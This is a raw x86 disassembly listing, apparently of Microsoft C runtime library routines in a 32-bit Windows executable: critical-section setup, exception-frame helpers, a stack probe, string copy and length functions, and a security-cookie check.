  423670:	or     BYTE PTR [esi+0x4],0x8
  423674:	lea    eax,[esi+0xc]
  423677:	push   0xfa0
  42367c:	push   eax
  42367d:	call   0x42493d
  423682:	test   eax,eax
  423684:	pop    ecx
  423685:	pop    ecx
  423686:	je     0x423631
  423688:	inc    DWORD PTR [esi+0x8]
  42368b:	jmp    0x423697
  42368d:	or     BYTE PTR [esi+0x4],0x40
  423691:	jmp    0x423697
  423693:	or     BYTE PTR [esi+0x4],0x80
  423697:	inc    ebx
  423698:	cmp    ebx,0x3
  42369b:	jl     0x423613
  4236a1:	push   DWORD PTR ds:0x45d148
  4236a7:	call   DWORD PTR ds:0x42805c
  4236ad:	xor    eax,eax
  4236af:	pop    edi
  4236b0:	pop    esi
  4236b1:	pop    ebp
  4236b2:	pop    ebx
  4236b3:	add    esp,0x48
  4236b6:	ret    
  4236b7:	push   0xc
  4236b9:	push   0x4284a8
  4236be:	call   0x4238a8
  4236c3:	mov    DWORD PTR [ebp-0x1c],0x428f00
  4236ca:	cmp    DWORD PTR [ebp-0x1c],0x428f00
  4236d1:	jae    0x4236f5
  4236d3:	and    DWORD PTR [ebp-0x4],0x0
  4236d7:	mov    eax,DWORD PTR [ebp-0x1c]
  4236da:	mov    eax,DWORD PTR [eax]
  4236dc:	test   eax,eax
  4236de:	je     0x4236eb
  4236e0:	call   eax
  4236e2:	jmp    0x4236eb
  4236e4:	xor    eax,eax
  4236e6:	inc    eax
  4236e7:	ret    
  4236e8:	mov    esp,DWORD PTR [ebp-0x18]
  4236eb:	or     DWORD PTR [ebp-0x4],0xffffffff
  4236ef:	add    DWORD PTR [ebp-0x1c],0x4
  4236f3:	jmp    0x4236ca
  4236f5:	call   0x4238e3
  4236fa:	ret    
  4236fb:	push   0xc
  4236fd:	push   0x4284b8
  423702:	call   0x4238a8
  423707:	mov    DWORD PTR [ebp-0x1c],0x428f08
  42370e:	cmp    DWORD PTR [ebp-0x1c],0x428f08
  423715:	jae    0x423739
  423717:	and    DWORD PTR [ebp-0x4],0x0
  42371b:	mov    eax,DWORD PTR [ebp-0x1c]
  42371e:	mov    eax,DWORD PTR [eax]
  423720:	test   eax,eax
  423722:	je     0x42372f
  423724:	call   eax
  423726:	jmp    0x42372f
  423728:	xor    eax,eax
  42372a:	inc    eax
  42372b:	ret    
  42372c:	mov    esp,DWORD PTR [ebp-0x18]
  42372f:	or     DWORD PTR [ebp-0x4],0xffffffff
  423733:	add    DWORD PTR [ebp-0x1c],0x4
  423737:	jmp    0x42370e
  423739:	call   0x4238e3
  42373e:	ret    
  42373f:	call   0x423986
  423744:	mov    eax,ds:0x45c304
  423749:	cmp    eax,0xffffffff
  42374c:	je     0x42375c
  42374e:	push   eax
  42374f:	call   DWORD PTR ds:0x428068
  423755:	or     DWORD PTR ds:0x45c304,0xffffffff
  42375c:	ret    
  42375d:	push   ebx
  42375e:	push   esi
  42375f:	call   DWORD PTR ds:0x428014
  423765:	push   DWORD PTR ds:0x45c304
  42376b:	mov    ebx,eax
  42376d:	call   DWORD PTR ds:0x428078
  423773:	mov    esi,eax
  423775:	test   esi,esi
  423777:	jne    0x4237c2
  423779:	push   0x88
  42377e:	push   0x1
  423780:	call   0x4249c8
  423785:	mov    esi,eax
  423787:	test   esi,esi
  423789:	pop    ecx
  42378a:	pop    ecx
  42378b:	je     0x4237ba
  42378d:	push   esi
  42378e:	push   DWORD PTR ds:0x45c304
  423794:	call   DWORD PTR ds:0x428074
  42379a:	test   eax,eax
  42379c:	je     0x4237ba
  42379e:	mov    DWORD PTR [esi+0x54],0x45c258
  4237a5:	mov    DWORD PTR [esi+0x14],0x1
  4237ac:	call   DWORD PTR ds:0x428070
  4237b2:	or     DWORD PTR [esi+0x4],0xffffffff
  4237b6:	mov    DWORD PTR [esi],eax
  4237b8:	jmp    0x4237c2
  4237ba:	push   0x10
  4237bc:	call   0x422970
  4237c1:	pop    ecx
  4237c2:	push   ebx
  4237c3:	call   DWORD PTR ds:0x42806c
  4237c9:	mov    eax,esi
  4237cb:	pop    esi
  4237cc:	pop    ebx
  4237cd:	ret    
  4237ce:	call   0x42393d
  4237d3:	test   eax,eax
  4237d5:	je     0x4237e7
  4237d7:	call   DWORD PTR ds:0x42807c
  4237dd:	cmp    eax,0xffffffff
  4237e0:	mov    ds:0x45c304,eax
  4237e5:	jne    0x4237ef
  4237e7:	call   0x42373f
  4237ec:	xor    eax,eax
  4237ee:	ret    
  4237ef:	push   esi
  4237f0:	push   0x88
  4237f5:	push   0x1
  4237f7:	call   0x4249c8
  4237fc:	mov    esi,eax
  4237fe:	test   esi,esi
  423800:	pop    ecx
  423801:	pop    ecx
  423802:	je     0x423834
  423804:	push   esi
  423805:	push   DWORD PTR ds:0x45c304
  42380b:	call   DWORD PTR ds:0x428074
  423811:	test   eax,eax
  423813:	je     0x423834
  423815:	mov    DWORD PTR [esi+0x54],0x45c258
  42381c:	mov    DWORD PTR [esi+0x14],0x1
  423823:	call   DWORD PTR ds:0x428070
  423829:	or     DWORD PTR [esi+0x4],0xffffffff
  42382d:	mov    DWORD PTR [esi],eax
  42382f:	xor    eax,eax
  423831:	inc    eax
  423832:	pop    esi
  423833:	ret    
  423834:	call   0x42373f
  423839:	xor    eax,eax
  42383b:	pop    esi
  42383c:	ret    
  42383d:	cmp    DWORD PTR ds:0x45cac4,0x2
  423844:	jne    0x423853
  423846:	cmp    DWORD PTR ds:0x45cad0,0x5
  42384d:	jb     0x423853
  42384f:	xor    eax,eax
  423851:	inc    eax
  423852:	ret    
  423853:	push   0x3
  423855:	pop    eax
  423856:	ret    
  423857:	xor    eax,eax
  423859:	cmp    DWORD PTR [esp+0x4],eax
  42385d:	push   0x0
  42385f:	sete   al
  423862:	push   0x1000
  423867:	push   eax
  423868:	call   DWORD PTR ds:0x428084
  42386e:	test   eax,eax
  423870:	mov    ds:0x45d140,eax
  423875:	je     0x4238a1
  423877:	call   0x42383d
  42387c:	cmp    eax,0x3
  42387f:	mov    ds:0x45d144,eax
  423884:	jne    0x4238a4
  423886:	push   0x3f8
  42388b:	call   0x424c4a
  423890:	test   eax,eax
  423892:	pop    ecx
  423893:	jne    0x4238a4
  423895:	push   DWORD PTR ds:0x45d140
  42389b:	call   DWORD PTR ds:0x428080
  4238a1:	xor    eax,eax
  4238a3:	ret    
  4238a4:	xor    eax,eax
  4238a6:	inc    eax
  4238a7:	ret    
  4238a8:	push   0x425778
  4238ad:	mov    eax,fs:0x0
  4238b3:	push   eax
  4238b4:	mov    eax,DWORD PTR [esp+0x10]
  4238b8:	mov    DWORD PTR [esp+0x10],ebp
  4238bc:	lea    ebp,[esp+0x10]
  4238c0:	sub    esp,eax
  4238c2:	push   ebx
  4238c3:	push   esi
  4238c4:	push   edi
  4238c5:	mov    eax,DWORD PTR [ebp-0x8]
  4238c8:	mov    DWORD PTR [ebp-0x18],esp
  4238cb:	push   eax
  4238cc:	mov    eax,DWORD PTR [ebp-0x4]
  4238cf:	mov    DWORD PTR [ebp-0x4],0xffffffff
  4238d6:	mov    DWORD PTR [ebp-0x8],eax
  4238d9:	lea    eax,[ebp-0x10]
  4238dc:	mov    fs:0x0,eax
  4238e2:	ret    
  4238e3:	mov    ecx,DWORD PTR [ebp-0x10]
  4238e6:	mov    DWORD PTR fs:0x0,ecx
  4238ed:	pop    ecx
  4238ee:	pop    edi
  4238ef:	pop    esi
  4238f0:	pop    ebx
  4238f1:	leave  
  4238f2:	push   ecx
  4238f3:	ret    
  4238f4:	int3   
  4238f5:	int3   
  4238f6:	int3   
  4238f7:	int3   
  4238f8:	int3   
  4238f9:	int3   
  4238fa:	int3   
  4238fb:	int3   
  4238fc:	int3   
  4238fd:	int3   
  4238fe:	int3   
  4238ff:	int3   
  423900:	cmp    eax,0x1000
  423905:	jae    0x423915
  423907:	neg    eax
  423909:	add    eax,esp
  42390b:	add    eax,0x4
  42390e:	test   DWORD PTR [eax],eax
  423910:	xchg   esp,eax
  423911:	mov    eax,DWORD PTR [eax]
  423913:	push   eax
  423914:	ret    
  423915:	push   ecx
  423916:	lea    ecx,[esp+0x8]
  42391a:	sub    ecx,0x1000
  423920:	sub    eax,0x1000
  423925:	test   DWORD PTR [ecx],eax
  423927:	cmp    eax,0x1000
  42392c:	jae    0x42391a
  42392e:	sub    ecx,eax
  423930:	mov    eax,esp
  423932:	test   DWORD PTR [ecx],eax
  423934:	mov    esp,ecx
  423936:	mov    ecx,DWORD PTR [eax]
  423938:	mov    eax,DWORD PTR [eax+0x4]
  42393b:	push   eax
  42393c:	ret    
  42393d:	push   esi
  42393e:	push   edi
  42393f:	xor    esi,esi
  423941:	mov    edi,0x45cc20
  423946:	cmp    DWORD PTR [esi*8+0x45c314],0x1
  42394e:	jne    0x42396e
  423950:	lea    eax,[esi*8+0x45c310]
  423957:	mov    DWORD PTR [eax],edi
  423959:	push   0xfa0
  42395e:	push   DWORD PTR [eax]
  423960:	add    edi,0x18
  423963:	call   0x42493d
  423968:	test   eax,eax
  42396a:	pop    ecx
  42396b:	pop    ecx
  42396c:	je     0x42397a
  42396e:	inc    esi
  42396f:	cmp    esi,0x24
  423972:	jl     0x423946
  423974:	xor    eax,eax
  423976:	inc    eax
  423977:	pop    edi
  423978:	pop    esi
  423979:	ret    
  42397a:	and    DWORD PTR [esi*8+0x45c310],0x0
  423982:	xor    eax,eax
  423984:	jmp    0x423977
  423986:	push   ebx
  423987:	mov    ebx,DWORD PTR ds:0x428064
  42398d:	push   esi
  42398e:	mov    esi,0x45c310
  423993:	push   edi
  423994:	mov    edi,DWORD PTR [esi]
  423996:	test   edi,edi
  423998:	je     0x4239ad
  42399a:	cmp    DWORD PTR [esi+0x4],0x1
  42399e:	je     0x4239ad
  4239a0:	push   edi
  4239a1:	call   ebx
  4239a3:	push   edi
  4239a4:	call   0x4244ba
  4239a9:	and    DWORD PTR [esi],0x0
  4239ac:	pop    ecx
  4239ad:	add    esi,0x8
  4239b0:	cmp    esi,0x45c430
  4239b6:	jl     0x423994
  4239b8:	mov    esi,0x45c310
  4239bd:	pop    edi
  4239be:	mov    eax,DWORD PTR [esi]
  4239c0:	test   eax,eax
  4239c2:	je     0x4239cd
  4239c4:	cmp    DWORD PTR [esi+0x4],0x1
  4239c8:	jne    0x4239cd
  4239ca:	push   eax
  4239cb:	call   ebx
  4239cd:	add    esi,0x8
  4239d0:	cmp    esi,0x45c430
  4239d6:	jl     0x4239be
  4239d8:	pop    esi
  4239d9:	pop    ebx
  4239da:	ret    
  4239db:	push   ebp
  4239dc:	mov    ebp,esp
  4239de:	mov    eax,DWORD PTR [ebp+0x8]
  4239e1:	push   DWORD PTR [eax*8+0x45c310]
  4239e8:	call   DWORD PTR ds:0x428090
  4239ee:	pop    ebp
  4239ef:	ret    
  4239f0:	push   ebp
  4239f1:	mov    ebp,esp
  4239f3:	push   esi
  4239f4:	mov    esi,DWORD PTR [ebp+0x8]
  4239f7:	lea    esi,[esi*8+0x45c310]
  4239fe:	cmp    DWORD PTR [esi],0x0
  423a01:	je     0x423a08
  423a03:	xor    eax,eax
  423a05:	inc    eax
  423a06:	jmp    0x423a6c
  423a08:	push   edi
  423a09:	push   0x18
  423a0b:	call   0x4245d2
  423a10:	mov    edi,eax
  423a12:	test   edi,edi
  423a14:	pop    ecx
  423a15:	jne    0x423a26
  423a17:	call   0x425850
  423a1c:	mov    DWORD PTR [eax],0xc
  423a22:	xor    eax,eax
  423a24:	jmp    0x423a6b
  423a26:	push   0xa
  423a28:	call   0x423a6f
  423a2d:	cmp    DWORD PTR [esi],0x0
  423a30:	pop    ecx
  423a31:	jne    0x423a59
  423a33:	push   0xfa0
  423a38:	push   edi
  423a39:	call   0x42493d
  423a3e:	test   eax,eax
  423a40:	pop    ecx
  423a41:	pop    ecx
  423a42:	jne    0x423a55
  423a44:	push   edi
  423a45:	call   0x4244ba
  423a4a:	push   0xa
  423a4c:	call   0x4239db
  423a51:	pop    ecx
  423a52:	pop    ecx
  423a53:	jmp    0x423a17
  423a55:	mov    DWORD PTR [esi],edi
  423a57:	jmp    0x423a60
  423a59:	push   edi
  423a5a:	call   0x4244ba
  423a5f:	pop    ecx
  423a60:	push   0xa
  423a62:	call   0x4239db
  423a67:	xor    eax,eax
  423a69:	pop    ecx
  423a6a:	inc    eax
  423a6b:	pop    edi
  423a6c:	pop    esi
  423a6d:	pop    ebp
  423a6e:	ret    
  423a6f:	push   ebp
  423a70:	mov    ebp,esp
  423a72:	mov    eax,DWORD PTR [ebp+0x8]
  423a75:	push   esi
  423a76:	lea    esi,[eax*8+0x45c310]
  423a7d:	cmp    DWORD PTR [esi],0x0
  423a80:	jne    0x423a95
  423a82:	push   eax
  423a83:	call   0x4239f0
  423a88:	test   eax,eax
  423a8a:	pop    ecx
  423a8b:	jne    0x423a95
  423a8d:	push   0x11
  423a8f:	call   0x422970
  423a94:	pop    ecx
  423a95:	push   DWORD PTR [esi]
  423a97:	call   DWORD PTR ds:0x428094
  423a9d:	pop    esi
  423a9e:	pop    ebp
  423a9f:	ret    
  423aa0:	push   esi
  423aa1:	push   DWORD PTR ds:0x45d268
  423aa7:	call   0x425a06
  423aac:	pop    ecx
  423aad:	mov    ecx,DWORD PTR ds:0x45d264
  423ab3:	mov    esi,eax
  423ab5:	mov    eax,ds:0x45d268
  423aba:	mov    edx,ecx
  423abc:	sub    edx,eax
  423abe:	add    edx,0x4
  423ac1:	cmp    esi,edx
  423ac3:	jae    0x423b13
  423ac5:	mov    ecx,0x800
  423aca:	cmp    esi,ecx
  423acc:	jae    0x423ad0
  423ace:	mov    ecx,esi
  423ad0:	add    ecx,esi
  423ad2:	push   ecx
  423ad3:	push   eax
  423ad4:	call   0x425859
  423ad9:	test   eax,eax
  423adb:	pop    ecx
  423adc:	pop    ecx
  423add:	jne    0x423af6
  423adf:	add    esi,0x10
  423ae2:	push   esi
  423ae3:	push   DWORD PTR ds:0x45d268
  423ae9:	call   0x425859
  423aee:	test   eax,eax
  423af0:	pop    ecx
  423af1:	pop    ecx
  423af2:	jne    0x423af6
  423af4:	pop    esi
  423af5:	ret    
  423af6:	mov    ecx,DWORD PTR ds:0x45d264
  423afc:	sub    ecx,DWORD PTR ds:0x45d268
  423b02:	mov    ds:0x45d268,eax
  423b07:	sar    ecx,0x2
  423b0a:	lea    ecx,[eax+ecx*4]
  423b0d:	mov    DWORD PTR ds:0x45d264,ecx
  423b13:	mov    DWORD PTR [ecx],edi
  423b15:	add    DWORD PTR ds:0x45d264,0x4
  423b1c:	mov    eax,edi
  423b1e:	pop    esi
  423b1f:	ret    
  423b20:	push   0x80
  423b25:	call   0x4245d2
  423b2a:	test   eax,eax
  423b2c:	pop    ecx
  423b2d:	mov    ds:0x45d268,eax
  423b32:	jne    0x423b38
  423b34:	push   0x18
  423b36:	pop    eax
  423b37:	ret    
  423b38:	and    DWORD PTR [eax],0x0
  423b3b:	mov    eax,ds:0x45d268
  423b40:	mov    ds:0x45d264,eax
  423b45:	xor    eax,eax
  423b47:	ret    
  423b48:	push   0xc
  423b4a:	push   0x4284c8
  423b4f:	call   0x4238a8
  423b54:	call   0x422bbb
  423b59:	and    DWORD PTR [ebp-0x4],0x0
  423b5d:	mov    edi,DWORD PTR [ebp+0x8]
  423b60:	call   0x423aa0
  423b65:	mov    DWORD PTR [ebp-0x1c],eax
  423b68:	or     DWORD PTR [ebp-0x4],0xffffffff
  423b6c:	call   0x423b7a
  423b71:	mov    eax,DWORD PTR [ebp-0x1c]
  423b74:	call   0x4238e3
  423b79:	ret    
  423b7a:	call   0x422bc4
  423b7f:	ret    
  423b80:	push   DWORD PTR [esp+0x4]
  423b84:	call   0x423b48
  423b89:	neg    eax
  423b8b:	sbb    eax,eax
  423b8d:	neg    eax
  423b8f:	pop    ecx
  423b90:	dec    eax
  423b91:	ret    
  423b92:	push   ebp
  423b93:	mov    ebp,esp
  423b95:	sub    esp,0x10
  423b98:	push   ebx
  423b99:	xor    ebx,ebx
  423b9b:	cmp    DWORD PTR ds:0x45cd70,ebx
  423ba1:	push   esi
  423ba2:	push   edi
  423ba3:	jne    0x423c12
  423ba5:	push   0x428538
  423baa:	call   DWORD PTR ds:0x428098
  423bb0:	mov    edi,eax
  423bb2:	cmp    edi,ebx
  423bb4:	je     0x423c4d
  423bba:	mov    esi,DWORD PTR ds:0x42801c
  423bc0:	push   0x42852c
  423bc5:	push   edi
  423bc6:	call   esi
  423bc8:	test   eax,eax
  423bca:	mov    ds:0x45cd70,eax
  423bcf:	je     0x423c4d
  423bd1:	push   0x42851c
  423bd6:	push   edi
  423bd7:	call   esi
  423bd9:	push   0x428508
  423bde:	push   edi
  423bdf:	mov    ds:0x45cd74,eax
  423be4:	call   esi
  423be6:	cmp    DWORD PTR ds:0x45cac4,0x2
  423bed:	mov    ds:0x45cd78,eax
  423bf2:	jne    0x423c12
  423bf4:	push   0x4284ec
  423bf9:	push   edi
  423bfa:	call   esi
  423bfc:	test   eax,eax
  423bfe:	mov    ds:0x45cd80,eax
  423c03:	je     0x423c12
  423c05:	push   0x4284d4
  423c0a:	push   edi
  423c0b:	call   esi
  423c0d:	mov    ds:0x45cd7c,eax
  423c12:	mov    eax,ds:0x45cd7c
  423c17:	test   eax,eax
  423c19:	je     0x423c57
  423c1b:	call   eax
  423c1d:	test   eax,eax
  423c1f:	je     0x423c3e
  423c21:	lea    ecx,[ebp-0x4]
  423c24:	push   ecx
  423c25:	push   0xc
  423c27:	lea    ecx,[ebp-0x10]
  423c2a:	push   ecx
  423c2b:	push   0x1
  423c2d:	push   eax
  423c2e:	call   DWORD PTR ds:0x45cd80
  423c34:	test   eax,eax
  423c36:	je     0x423c3e
  423c38:	test   BYTE PTR [ebp-0x8],0x1
  423c3c:	jne    0x423c57
  423c3e:	cmp    DWORD PTR ds:0x45cad0,0x4
  423c45:	jb     0x423c51
  423c47:	or     BYTE PTR [ebp+0x12],0x20
  423c4b:	jmp    0x423c76
  423c4d:	xor    eax,eax
  423c4f:	jmp    0x423c86
  423c51:	or     BYTE PTR [ebp+0x12],0x4
  423c55:	jmp    0x423c76
  423c57:	mov    eax,ds:0x45cd74
  423c5c:	test   eax,eax
  423c5e:	je     0x423c76
  423c60:	call   eax
  423c62:	mov    ebx,eax
  423c64:	test   ebx,ebx
  423c66:	je     0x423c76
  423c68:	mov    eax,ds:0x45cd78
  423c6d:	test   eax,eax
  423c6f:	je     0x423c76
  423c71:	push   ebx
  423c72:	call   eax
  423c74:	mov    ebx,eax
  423c76:	push   DWORD PTR [ebp+0x10]
  423c79:	push   DWORD PTR [ebp+0xc]
  423c7c:	push   DWORD PTR [ebp+0x8]
  423c7f:	push   ebx
  423c80:	call   DWORD PTR ds:0x45cd70
  423c86:	pop    edi
  423c87:	pop    esi
  423c88:	pop    ebx
  423c89:	leave  
  423c8a:	ret    
  423c8b:	int3   
  423c8c:	int3   
  423c8d:	int3   
  423c8e:	int3   
  423c8f:	int3   
  423c90:	push   edi
  423c91:	mov    edi,DWORD PTR [esp+0x8]
  423c95:	jmp    0x423d05
  423c97:	lea    esp,[esp+0x0]
  423c9e:	mov    edi,edi
  423ca0:	mov    ecx,DWORD PTR [esp+0x4]
  423ca4:	push   edi
  423ca5:	test   ecx,0x3
  423cab:	je     0x423cc0
  423cad:	mov    al,BYTE PTR [ecx]
  423caf:	add    ecx,0x1
  423cb2:	test   al,al
  423cb4:	je     0x423cf3
  423cb6:	test   ecx,0x3
  423cbc:	jne    0x423cad
  423cbe:	mov    edi,edi
  423cc0:	mov    eax,DWORD PTR [ecx]
  423cc2:	mov    edx,0x7efefeff
  423cc7:	add    edx,eax
  423cc9:	xor    eax,0xffffffff
  423ccc:	xor    eax,edx
  423cce:	add    ecx,0x4
  423cd1:	test   eax,0x81010100
  423cd6:	je     0x423cc0
  423cd8:	mov    eax,DWORD PTR [ecx-0x4]
  423cdb:	test   al,al
  423cdd:	je     0x423d02
  423cdf:	test   ah,ah
  423ce1:	je     0x423cfd
  423ce3:	test   eax,0xff0000
  423ce8:	je     0x423cf8
  423cea:	test   eax,0xff000000
  423cef:	je     0x423cf3
  423cf1:	jmp    0x423cc0
  423cf3:	lea    edi,[ecx-0x1]
  423cf6:	jmp    0x423d05
  423cf8:	lea    edi,[ecx-0x2]
  423cfb:	jmp    0x423d05
  423cfd:	lea    edi,[ecx-0x3]
  423d00:	jmp    0x423d05
  423d02:	lea    edi,[ecx-0x4]
  423d05:	mov    ecx,DWORD PTR [esp+0xc]
  423d09:	test   ecx,0x3
  423d0f:	je     0x423d2e
  423d11:	mov    dl,BYTE PTR [ecx]
  423d13:	add    ecx,0x1
  423d16:	test   dl,dl
  423d18:	je     0x423d80
  423d1a:	mov    BYTE PTR [edi],dl
  423d1c:	add    edi,0x1
  423d1f:	test   ecx,0x3
  423d25:	jne    0x423d11
  423d27:	jmp    0x423d2e
  423d29:	mov    DWORD PTR [edi],edx
  423d2b:	add    edi,0x4
  423d2e:	mov    edx,0x7efefeff
  423d33:	mov    eax,DWORD PTR [ecx]
  423d35:	add    edx,eax
  423d37:	xor    eax,0xffffffff
  423d3a:	xor    eax,edx
  423d3c:	mov    edx,DWORD PTR [ecx]
  423d3e:	add    ecx,0x4
  423d41:	test   eax,0x81010100
  423d46:	je     0x423d29
  423d48:	test   dl,dl
  423d4a:	je     0x423d80
  423d4c:	test   dh,dh
  423d4e:	je     0x423d77
  423d50:	test   edx,0xff0000
  423d56:	je     0x423d6a
  423d58:	test   edx,0xff000000
  423d5e:	je     0x423d62
  423d60:	jmp    0x423d29
  423d62:	mov    DWORD PTR [edi],edx
  423d64:	mov    eax,DWORD PTR [esp+0x8]
  423d68:	pop    edi
  423d69:	ret    
  423d6a:	mov    WORD PTR [edi],dx
  423d6d:	mov    eax,DWORD PTR [esp+0x8]
  423d71:	mov    BYTE PTR [edi+0x2],0x0
  423d75:	pop    edi
  423d76:	ret    
  423d77:	mov    WORD PTR [edi],dx
  423d7a:	mov    eax,DWORD PTR [esp+0x8]
  423d7e:	pop    edi
  423d7f:	ret    
  423d80:	mov    BYTE PTR [edi],dl
  423d82:	mov    eax,DWORD PTR [esp+0x8]
  423d86:	pop    edi
  423d87:	ret    
  423d88:	int3   
  423d89:	int3   
  423d8a:	int3   
  423d8b:	int3   
  423d8c:	int3   
  423d8d:	int3   
  423d8e:	int3   
  423d8f:	int3   
  423d90:	mov    ecx,DWORD PTR [esp+0xc]
  423d94:	push   edi
  423d95:	test   ecx,ecx
  423d97:	je     0x423e2f
  423d9d:	push   esi
  423d9e:	push   ebx
  423d9f:	mov    ebx,ecx
  423da1:	mov    esi,DWORD PTR [esp+0x14]
  423da5:	test   esi,0x3
  423dab:	mov    edi,DWORD PTR [esp+0x10]
  423daf:	jne    0x423dbc
  423db1:	shr    ecx,0x2
  423db4:	jne    0x423e3f
  423dba:	jmp    0x423de3
  423dbc:	mov    al,BYTE PTR [esi]
  423dbe:	add    esi,0x1
  423dc1:	mov    BYTE PTR [edi],al
  423dc3:	add    edi,0x1
  423dc6:	sub    ecx,0x1
  423dc9:	je     0x423df6
  423dcb:	test   al,al
  423dcd:	je     0x423dfe
  423dcf:	test   esi,0x3
  423dd5:	jne    0x423dbc
  423dd7:	mov    ebx,ecx
  423dd9:	shr    ecx,0x2
  423ddc:	jne    0x423e3f
  423dde:	and    ebx,0x3
  423de1:	je     0x423df6
  423de3:	mov    al,BYTE PTR [esi]
  423de5:	add    esi,0x1
  423de8:	mov    BYTE PTR [edi],al
  423dea:	add    edi,0x1
  423ded:	test   al,al
  423def:	je     0x423e28
  423df1:	sub    ebx,0x1
  423df4:	jne    0x423de3
  423df6:	mov    eax,DWORD PTR [esp+0x10]
  423dfa:	pop    ebx
  423dfb:	pop    esi
  423dfc:	pop    edi
  423dfd:	ret    
  423dfe:	test   edi,0x3
  423e04:	je     0x423e1c
  423e06:	mov    BYTE PTR [edi],al
  423e08:	add    edi,0x1
  423e0b:	sub    ecx,0x1
  423e0e:	je     0x423eac
  423e14:	test   edi,0x3
  423e1a:	jne    0x423e06
  423e1c:	mov    ebx,ecx
  423e1e:	shr    ecx,0x2
  423e21:	jne    0x423e97
  423e23:	mov    BYTE PTR [edi],al
  423e25:	add    edi,0x1
  423e28:	sub    ebx,0x1
  423e2b:	jne    0x423e23
  423e2d:	pop    ebx
  423e2e:	pop    esi
  423e2f:	mov    eax,DWORD PTR [esp+0x8]
  423e33:	pop    edi
  423e34:	ret    
  423e35:	mov    DWORD PTR [edi],edx
  423e37:	add    edi,0x4
  423e3a:	sub    ecx,0x1
  423e3d:	je     0x423dde
  423e3f:	mov    edx,0x7efefeff
  423e44:	mov    eax,DWORD PTR [esi]
  423e46:	add    edx,eax
  423e48:	xor    eax,0xffffffff
  423e4b:	xor    eax,edx
  423e4d:	mov    edx,DWORD PTR [esi]
  423e4f:	add    esi,0x4
  423e52:	test   eax,0x81010100
  423e57:	je     0x423e35
  423e59:	test   dl,dl
  423e5b:	je     0x423e89
  423e5d:	test   dh,dh
  423e5f:	je     0x423e7f
  423e61:	test   edx,0xff0000
  423e67:	je     0x423e75
  423e69:	test   edx,0xff000000
  423e6f:	jne    0x423e35
  423e71:	mov    DWORD PTR [edi],edx
  423e73:	jmp    0x423e8d
  423e75:	and    edx,0xffff
  423e7b:	mov    DWORD PTR [edi],edx
  423e7d:	jmp    0x423e8d
  423e7f:	and    edx,0xff
  423e85:	mov    DWORD PTR [edi],edx
  423e87:	jmp    0x423e8d
  423e89:	xor    edx,edx
  423e8b:	mov    DWORD PTR [edi],edx
  423e8d:	add    edi,0x4
  423e90:	xor    eax,eax
  423e92:	sub    ecx,0x1
  423e95:	je     0x423ea3
  423e97:	xor    eax,eax
  423e99:	mov    DWORD PTR [edi],eax
  423e9b:	add    edi,0x4
  423e9e:	sub    ecx,0x1
  423ea1:	jne    0x423e99
  423ea3:	and    ebx,0x3
  423ea6:	jne    0x423e23
  423eac:	mov    eax,DWORD PTR [esp+0x10]
  423eb0:	pop    ebx
  423eb1:	pop    esi
  423eb2:	pop    edi
  423eb3:	ret    
  423eb4:	int3   
  423eb5:	int3   
  423eb6:	int3   
  423eb7:	int3   
  423eb8:	int3   
  423eb9:	int3   
  423eba:	int3   
  423ebb:	int3   
  423ebc:	int3   
  423ebd:	int3   
  423ebe:	int3   
  423ebf:	int3   
  423ec0:	mov    ecx,DWORD PTR [esp+0x4]
  423ec4:	test   ecx,0x3
  423eca:	je     0x423ef0
  423ecc:	mov    al,BYTE PTR [ecx]
  423ece:	add    ecx,0x1
  423ed1:	test   al,al
  423ed3:	je     0x423f23
  423ed5:	test   ecx,0x3
  423edb:	jne    0x423ecc
  423edd:	add    eax,0x0
  423ee2:	lea    esp,[esp+0x0]
  423ee9:	lea    esp,[esp+0x0]
  423ef0:	mov    eax,DWORD PTR [ecx]
  423ef2:	mov    edx,0x7efefeff
  423ef7:	add    edx,eax
  423ef9:	xor    eax,0xffffffff
  423efc:	xor    eax,edx
  423efe:	add    ecx,0x4
  423f01:	test   eax,0x81010100
  423f06:	je     0x423ef0
  423f08:	mov    eax,DWORD PTR [ecx-0x4]
  423f0b:	test   al,al
  423f0d:	je     0x423f41
  423f0f:	test   ah,ah
  423f11:	je     0x423f37
  423f13:	test   eax,0xff0000
  423f18:	je     0x423f2d
  423f1a:	test   eax,0xff000000
  423f1f:	je     0x423f23
  423f21:	jmp    0x423ef0
  423f23:	lea    eax,[ecx-0x1]
  423f26:	mov    ecx,DWORD PTR [esp+0x4]
  423f2a:	sub    eax,ecx
  423f2c:	ret    
  423f2d:	lea    eax,[ecx-0x2]
  423f30:	mov    ecx,DWORD PTR [esp+0x4]
  423f34:	sub    eax,ecx
  423f36:	ret    
  423f37:	lea    eax,[ecx-0x3]
  423f3a:	mov    ecx,DWORD PTR [esp+0x4]
  423f3e:	sub    eax,ecx
  423f40:	ret    
  423f41:	lea    eax,[ecx-0x4]
  423f44:	mov    ecx,DWORD PTR [esp+0x4]
  423f48:	sub    eax,ecx
  423f4a:	ret    
  423f4b:	push   0x8
  423f4d:	push   0x428548
  423f52:	call   0x4238a8
  423f57:	and    DWORD PTR [ebp-0x4],0x0
  423f5b:	push   0x0
  423f5d:	push   0x1
  423f5f:	call   0x425ad2
  423f64:	pop    ecx
  423f65:	pop    ecx
  423f66:	jmp    0x423f6f
  423f68:	xor    eax,eax
  423f6a:	inc    eax
  423f6b:	ret    
  423f6c:	mov    esp,DWORD PTR [ebp-0x18]
  423f6f:	or     DWORD PTR [ebp-0x4],0xffffffff
  423f73:	push   0x3
  423f75:	call   DWORD PTR ds:0x42802c
  423f7b:	int3   
  423f7c:	cmp    ecx,DWORD PTR ds:0x45c430
  423f82:	jne    0x423f85
  423f84:	ret    
  423f85:	jmp    0x423f4b
  423f8a:	movzx  eax,BYTE PTR [esp+0x4]
  423f8f:	mov    cl,BYTE PTR [esp+0xc]
  423f93:	test   BYTE PTR [eax+0x45cf21],cl
  423f99:	jne    0x423fb7
  423f9b:	cmp    DWORD PTR [esp+0x8],0x0
  423fa0:	je     0x423fb0
  423fa2:	movzx  eax,WORD PTR [eax*2+0x428942]
  423faa:	and    eax,DWORD PTR [esp+0x8]
  423fae:	jmp    0x423fb2
  423fb0:	xor    eax,eax
  423fb2:	test   eax,eax
  423fb4:	jne    0x423fb7
  423fb6:	ret    
  423fb7:	xor    eax,eax
  423fb9:	inc    eax
  423fba:	ret    
  423fbb:	push   0x4
  423fbd:	push   0x0
  423fbf:	push   DWORD PTR [esp+0xc]
  423fc3:	call   0x423f8a
  423fc8:	add    esp,0xc
  423fcb:	ret    
  423fcc:	sub    eax,0x3a4
  423fd1:	je     0x423ff5
  423fd3:	sub    eax,0x4
  423fd6:	je     0x423fef
  423fd8:	sub    eax,0xd
  423fdb:	je     0x423fe9
